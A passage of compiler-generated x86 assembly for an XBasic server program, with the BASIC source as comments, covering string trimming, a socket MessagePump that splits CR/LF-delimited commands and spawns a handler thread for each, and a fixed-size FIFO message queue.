; .forlimit12.0094 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
align 8
for.0094.server:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0094.server			;;; i154
;
; [1670] IF str${p} != char THEN out$ = out$ + CHR$(str${p})
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> else.0095.server			;;; i219
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0095.server:
end.if.0095.server:
;
; [1671] NEXT p
do.next.0094.server:
	inc	d[ebp-44]			;;; i229
	jmp	for.0094.server			;;; i231
end.for.0094.server:
;
; [1673] str$ = out$
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1674] RETURN str$
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func12.server			;;; i258
;
; [1676] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.trim.server:  ;;; Function end label for Assembly Programmers.
end.func12.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func12.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func12.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  trim ()  *****
;  *****
;
; [1678] FUNCTION MessagePump (socket,msg$)
.code
;
#ifdef MessagePump.socket
#undef MessagePump.socket
#endif
#define MessagePump.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef MessagePump.msg$
#undef MessagePump.msg$
#endif
#define MessagePump.msg$ ebp+12	; exposes function argument 'msg$'
;
align 16
_MessagePump.server@8:
;  *****
;  *****  FUNCTION  MessagePump ()  *****
;  *****
func5.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.231:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.231			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
funcBody5.server:
;
; [1679] SHARED APPLSTATUS
;
; [1680] STATIC cmd$,scmd$
data section 'globals$statics'
align	4
%5%cmd$.server:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%5%scmd$.server:	db 4 dup ?
.code
;
; [1683] msg$ = cmd$ + msg$
	mov	eax,[%5%cmd$.server]			;;; i663a
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1684] msglen = LEN(msg$)
#ifdef MessagePump.msglen
#undef MessagePump.msglen
#endif
#define MessagePump.msglen ebp-40	; exposes local variable 'msglen'
;
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.223			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.223:
	mov	d[ebp-40],eax			;;; i670
;
; [1685] p = LEN (cmd$)
#ifdef MessagePump.p
#undef MessagePump.p
#endif
#define MessagePump.p ebp-44	; exposes local variable 'p'
;
	mov	eax,d[%5%cmd$.server]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.224			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.224:
	mov	d[ebp-44],eax			;;; i670
;
; [1686] start = 1
#ifdef MessagePump.start
#undef MessagePump.start
#endif
#define MessagePump.start ebp-48	; exposes local variable 'start'
;
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1687] flag = $$FALSE
#ifdef MessagePump.flag
#undef MessagePump.flag
#endif
#define MessagePump.flag ebp-52	; exposes local variable 'flag'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1689] DO
align 8
do.0096.server:
;
; [1690] SELECT CASE msg${p}
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+12]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
; .select5.0097 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
;
; [1691] CASE 0x0D		:flag = $$TRUE
	mov	eax,13			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0097.0001.server			;;; i71
	mov	eax,-1			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1692] CASE 0x0A		:IFT flag THEN
	jmp	end.select.0097.server			;;; i69
case.0097.0001.server:
	mov	eax,10			;;; i659
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0097.0002.server			;;; i71
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0098.server			;;; i221
;
; [1693] flag = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1694] IF (p-start) < 1 THEN EXIT SELECT
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	cmp	eax,1			;;; i684a
	jge	>> else.0099.server			;;; i219
	jmp	end.select.0097.server			;;; i147
else.0099.server:
end.if.0099.server:
;
; [1695] IF start > LEN (msg$) THEN EXIT SELECT
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.225			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.225:
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.009A.server			;;; i219
	jmp	end.select.0097.server			;;; i147
else.009A.server:
end.if.009A.server:
;
; [1696] cmd$ = MID$(msg$,start,p-start)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	mov	ebx,addr %5%cmd$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1697] IF cmd$ THEN
	mov	eax,[%5%cmd$.server]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.009B.server			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.009B.server			;;; i218
;
; [1698] scmd$ = cmd$
	mov	eax,[%5%cmd$.server]			;;; i663a
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %5%scmd$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1699] 'QueueMsg ($$QM_WRITE,socket,cmd$)
;
; [1700] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1701] _beginthreadex (0, 0,&ProcessCommandB(),&scmd$, 0, &tid)
	mov	eax,addr _ProcessCommandB.server@4			;;; i599
; .xstk5.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[%5%scmd$.server]			;;; i642
; .xstk5.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
#ifdef MessagePump.tid
#undef MessagePump.tid
#endif
#define MessagePump.tid ebp-76	; exposes local variable 'tid'
;
	lea	eax,[ebp-76]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	0			;;; i656a
	push	0			;;; i656a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [1702] Sleep (20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1703] END IF
else.009B.server:
end.if.009B.server:
;
; [1704] cmd$ = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %5%cmd$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1705] start = p+2
	mov	eax,d[ebp-44]			;;; i665
	add	eax,2			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [1706] ELSE
	jmp	end.if.0098.server			;;; i107
else.0098.server:
;
; [1707] flag = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1708] END IF
end.if.0098.server:
;
; [1709] CASE ELSE		:IFT flag THEN flag = $$FALSE
	jmp	end.select.0097.server			;;; i69
case.0097.0002.server:
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.009C.server			;;; i221
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
else.009C.server:
end.if.009C.server:
;
; [1710] END SELECT
end.select.0097.server:
;
; [1712] INC p
	inc	d[ebp-44]			;;; i84
;
; [1713] LOOP WHILE ((p < msglen) && (APPLSTATUS == $$TRUE))
do.loop.0096.server:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-40]			;;; i665
	cmp	eax,ebx			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jge	> A.226			;;; i467
	not	eax			;;; i468
A.226:
;+peep
	mov	ebx,d[%APPLSTATUS.server]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.227			;;; i467
	not	ebx			;;; i468
A.227:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0096.server			;;; i195
end.do.0096.server:
;
; [1715] IF (p-start+1) < 0 THEN RETURN 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	add	eax,1			;;; i775
	cmp	eax,0			;;; i684a
	jge	>> else.009D.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func5.server			;;; i258
else.009D.server:
end.if.009D.server:
;
; [1716] IF start > LEN (msg$) THEN RETURN 0
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.228			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.228:
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.009E.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func5.server			;;; i258
else.009E.server:
end.if.009E.server:
;
; [1717] cmd$ = MID$(msg$,start,p-start+1)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	add	eax,1			;;; i775
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	mov	ebx,addr %5%cmd$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1718] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func5.server			;;; i258
;
; [1719] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MessagePump.server:  ;;; Function end label for Assembly Programmers.
end.func5.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  MessagePump ()  *****
;  *****
;
; [1721] FUNCTION QueueMsg (accessType,socket,STRING message)
.code
;
#ifdef QueueMsg.accessType
#undef QueueMsg.accessType
#endif
#define QueueMsg.accessType ebp+8	; exposes function argument 'accessType'
;
;
#ifdef QueueMsg.socket
#undef QueueMsg.socket
#endif
#define QueueMsg.socket ebp+12	; exposes function argument 'socket'
;
;
#ifdef QueueMsg.message
#undef QueueMsg.message
#endif
#define QueueMsg.message ebp+16	; exposes function argument 'message'
;
align 16
_QueueMsg.server@12:
;  *****
;  *****  FUNCTION  QueueMsg ()  *****
;  *****
func6.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.244:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.244			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
funcBody6.server:
;
; [1722] STATIC TQMSG QMsg[]
data section 'globals$statics'
align	4
%%6%%QMsg.server:	db 4 dup ?
.code
;
; [1723] STATIC total,id
data section 'globals$statics'
align	4
%6%total.server:	db 4 dup ?
.code
data section 'globals$statics'
align	4
%6%id.server:	db 4 dup ?
.code
;
; [1724] SHARED APPLSTATUS
;
; [1727] IF (WaitForSingleObject(#hsmQueueMsg,30000) == $$WAIT_TIMEOUT) THEN
	push	30000			;;; i656a
	push	[%#hsmQueueMsg.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.009F.server			;;; i219
;
; [1728] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func6.server			;;; i258
;
; [1729] END IF
else.009F.server:
end.if.009F.server:
;
; [1731] ret = $$FALSE
#ifdef QueueMsg.ret
#undef QueueMsg.ret
#endif
#define QueueMsg.ret ebp-40	; exposes local variable 'ret'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [1732] SELECT CASE accessType
	mov	eax,d[ebp+8]			;;; i665
; .select6.00A0 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
;
; [1733] CASE $$QM_WRITE		:' add message queue
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00A0.0001.server			;;; i71
;
; [1734] FOR m = 1 TO total' search for free slot
#ifdef QueueMsg.m
#undef QueueMsg.m
#endif
#define QueueMsg.m ebp-48	; exposes local variable 'm'
;
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%6%total.server]			;;; i663a
; .forlimit6.00A1 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.00A1.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00A1.server			;;; i154
;
; [1735] IF (QMsg[m].id == 0) THEN' free slot found
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,0			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.232			;;; i367
	call	%_eeeOverflow			;;; i368
A.232:
	cmp	eax,ebx			;;; i684a
	jne	>> else.00A2.server			;;; i219
;
; [1736] QMsg[m].id = id
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[%6%id.server]			;;; i663a
	mov	d[eax],ebx			;;; i13b
;
; [1737] QMsg[m].socket = socket
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	mov	d[eax+4],ebx			;;; i13b
;
; [1738] QMsg[m].msg = message
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,[ebp+16]			;;; i665
	lea	edi,[eax+8]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,256			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [1739] INC id
	inc	d[%6%id.server]			;;; i85
;
; [1740] IF (id == QMsg[0].id) THEN id = 1
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	lea	eax,[edx]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,d[%6%id.server]			;;; i663a
	cmp	eax,ebx			;;; i684a
	jne	>> else.00A3.server			;;; i219
	mov	eax,1			;;; i659
	mov	d[%6%id.server],eax			;;; i668
else.00A3.server:
end.if.00A3.server:
;
; [1741] ret = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [1742] EXIT SELECT
	jmp	end.select.00A0.server			;;; i147
;
; [1743] END IF
else.00A2.server:
end.if.00A2.server:
;
; [1744] NEXT m
do.next.00A1.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.00A1.server			;;; i231
end.for.00A1.server:
;
; [1746] CASE $$QM_READ		:' read message (if any) then remove from queue
	jmp	end.select.00A0.server			;;; i69
case.00A0.0001.server:
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00A0.0002.server			;;; i71
;
; [1747] r = 0
#ifdef QueueMsg.r
#undef QueueMsg.r
#endif
#define QueueMsg.r ebp-56	; exposes local variable 'r'
;
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1748] FOR m = 1 TO total' its FIFO so find message with lowest .id
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%6%total.server]			;;; i663a
; .forlimit6.00A4 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
align 8
for.00A4.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-60]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00A4.server			;;; i154
;
; [1749] IF QMsg[m].id > 0 THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,0			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.234			;;; i367
	call	%_eeeOverflow			;;; i368
A.234:
	cmp	eax,ebx			;;; i684a
	jbe	>> else.00A5.server			;;; i219
;
; [1750] IF QMsg[m].id < QMsg[r].id THEN r = m
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	ecx,d[%%6%%QMsg.server]			;;; i663a
	imul	ebx,264			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	ebx,d[ebx]			;;; i313b
	cmp	eax,ebx			;;; i684a
	jae	>> else.00A6.server			;;; i219
	mov	eax,d[ebp-48]			;;; i665
	mov	d[ebp-56],eax			;;; i670
else.00A6.server:
end.if.00A6.server:
;
; [1751] END IF
else.00A5.server:
end.if.00A5.server:
;
; [1752] NEXT m
do.next.00A4.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.00A4.server			;;; i231
end.for.00A4.server:
;
; [1754] IF r THEN' message found
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00A7.server			;;; i221
;
; [1755] socket = QMsg[r].socket
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp+12],eax			;;; i670
;
; [1756] message = RTRIM$(QMsg[r].msg)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	lea	esi,[eax+8]			;;; i308
	mov	edi,256			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1758] QMsg[r].id = 0' remove message
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1759] QMsg[r].msg = ""
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	xor	ebx,ebx			;;; i658
	lea	edi,[eax+8]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,256			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [1760] QMsg[r].socket = 0
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax+4],ebx			;;; i13b
;
; [1761] ret = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [1762] END IF
else.00A7.server:
end.if.00A7.server:
;
; [1764] 'CASE $$QM_DELETE	:
;
; [1765] CASE $$QM_PEEK		:
	jmp	end.select.00A0.server			;;; i69
case.00A0.0002.server:
	mov	eax,4			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00A0.0003.server			;;; i71
;
; [1766] r = 0
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1767] FOR m = 1 TO total
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%6%total.server]			;;; i663a
; .forlimit6.00A8 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
align 8
for.00A8.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-64]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00A8.server			;;; i154
;
; [1768] IF QMsg[m].id > 0 THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,0			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.236			;;; i367
	call	%_eeeOverflow			;;; i368
A.236:
	cmp	eax,ebx			;;; i684a
	jbe	>> else.00A9.server			;;; i219
;
; [1769] IF QMsg[m].id < QMsg[r].id THEN r = m
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	ecx,d[%%6%%QMsg.server]			;;; i663a
	imul	ebx,264			;;; i465a
	lea	ebx,[ecx+ebx]			;;; i464
	mov	ebx,d[ebx]			;;; i313b
	cmp	eax,ebx			;;; i684a
	jae	>> else.00AA.server			;;; i219
	mov	eax,d[ebp-48]			;;; i665
	mov	d[ebp-56],eax			;;; i670
else.00AA.server:
end.if.00AA.server:
;
; [1770] END IF
else.00A9.server:
end.if.00A9.server:
;
; [1771] NEXT m
do.next.00A8.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.00A8.server			;;; i231
end.for.00A8.server:
;
; [1772] IF r THEN
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00AB.server			;;; i221
;
; [1773] socket = QMsg[r].socket
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp+12],eax			;;; i670
;
; [1774] message = RTRIM$(QMsg[r].msg)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	lea	esi,[eax+8]			;;; i308
	mov	edi,256			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	d[esp],eax			;;; i887
	call	%_rtrim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1775] ret = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [1776] END IF
else.00AB.server:
end.if.00AB.server:
;
; [1777] CASE $$QM_INIT		:
	jmp	end.select.00A0.server			;;; i69
case.00A0.0003.server:
	mov	eax,5			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00A0.0004.server			;;; i71
;
; [1778] total = 100
	mov	eax,100			;;; i659
	mov	d[%6%total.server],eax			;;; i668
;
; [1779] id = 1
	mov	eax,1			;;; i659
	mov	d[%6%id.server],eax			;;; i668
;
; [1780] DIM QMsg[total]
	sub	esp,64			;;; i430
	mov	eax,d[%6%total.server]			;;; i663a
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%6%%QMsg.server]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1048837880			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%6%%QMsg.server],eax			;;; i668
;
; [1781] FOR m = 0 TO total
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[%6%total.server]			;;; i663a
; .forlimit6.00AC = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
align 8
for.00AC.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-68]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00AC.server			;;; i154
;
; [1782] QMsg[m].id = 0
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1783] QMsg[m].socket = 0
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax+4],ebx			;;; i13b
;
; [1784] QMsg[m].msg = ""
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[%%6%%QMsg.server]			;;; i663a
	imul	eax,264			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	xor	ebx,ebx			;;; i658
	lea	edi,[eax+8]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,256			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
